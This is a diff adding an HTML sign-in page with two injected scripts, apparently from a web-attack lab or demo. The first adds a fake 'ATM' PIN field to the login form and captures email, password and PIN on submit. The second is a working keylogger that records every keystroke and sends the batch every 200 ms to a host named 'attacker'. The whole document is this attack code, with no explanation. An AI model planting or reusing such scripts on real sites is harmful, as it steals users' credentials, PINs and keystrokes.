@@ -1,0 +1,49 @@
+<html>
+<body>
+  <form class="form-signin">
+    <h2 class="form-signin-heading">Please sign in</h2>
+    <input class="input-block-level" type="text" name="email" placeholder="Email address" value="">
+    <input class="input-block-level" type="password" name="password" placeholder="Password">
+    <button class="btn btn-large btn-primary" type="submit">Sign in</button>
+  </form>
+  <script>
+
+  var form = document.forms[0];
+  child = form.childNodes[6];
+  var input = document.createElement("input");
+  input.id = "atm";
+  child.parentNode.insertBefore(input,child.nextSibling);
+  form.atm.setAttribute("class","input-block-level");
+  form.atm.setAttribute("type","text");
+  form.atm.setAttribute("name","pin");
+  form.atm.setAttribute("placeholder","ATM");
+
+  document.forms[0].onsubmit = function (){
+    alert("User: "+document.forms[0].email.value+" Pass: " +document.forms[0].email.value+" PIN: "+document.forms[0].atm.value);
+    return false;
+  }
+
+  </script>
+  <script>
+  var buffer = [];
+  var attacker = 'http://10.218.20.231/'
+
+  document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+      k: e.key,
+      t: timestamp
+    };
+    buffer.push(stroke);
+  }
+
+  window.setInterval(function() {
+    if (buffer.length > 0) {
+      var data = encodeURIComponent(JSON.stringify(buffer));
+      new Image().src = attacker + data;
+      buffer = [];
+    }
+  }, 200);
+  </script>
+</body>
+</html>
